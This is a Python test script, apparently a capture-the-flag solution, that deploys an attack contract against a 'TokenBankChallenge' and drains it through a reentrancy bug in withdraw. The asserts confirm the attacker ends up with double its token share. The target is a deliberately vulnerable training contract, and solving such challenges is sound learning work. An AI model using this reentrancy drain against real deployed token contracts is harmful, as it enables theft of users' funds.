from lib2to3.pgen2 import token
from brownie import TokenBankChallenge, BankAttack
from eth_utils import to_bytes
from scripts.helpful_scripts import *
from web3 import Web3, eth

amount = Web3.toWei(1, "ether")

"""
    reentrancy in withdraw.
"""


def test_bank():
    attacker = BankAttack.deploy({"from": accounts[1]})
    bank = TokenBankChallenge.deploy(attacker.address, {"from": accounts[0]})

    attacker.setVictimAddress(bank.address)

    attacker_balance = bank.balanceOf(attacker.address)
    bank.withdraw(attacker_balance, {"from": attacker.address})
    assert bank.isComplete() == 0
    assert attacker.myBalance() == (500000 * 10 ** 18) * 2
    assert bank.token().balanceOf(attacker.address) == (500000 * 10 ** 18) * 2
